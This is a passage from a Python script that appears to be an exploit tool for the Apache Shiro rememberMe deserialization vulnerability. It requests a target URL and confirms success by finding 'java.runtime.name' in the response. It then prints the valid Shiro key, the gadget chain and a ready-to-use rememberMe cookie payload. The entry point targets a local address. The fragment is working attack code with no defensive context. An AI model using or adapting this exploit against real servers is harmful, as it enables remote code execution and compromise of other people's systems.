            r = requests.get(url, headers=headers, verify=False,allow_redirects=False)
            if r.status_code ==200 and b"java.runtime.name" in r.content:
                print("[+] " + url + "\n[+] shiro_key= "+ key + "\n[+] Gadget= " + Gadget)
                base64_ciphertext = "Cookie: rememberMe=%s\n\n" % base64_ciphertext
                print(base64_ciphertext)
                isvuln = True
                break

if __name__ == '__main__':
    url = "http://127.0.0.1:8080/"
    encode_rememberme(url)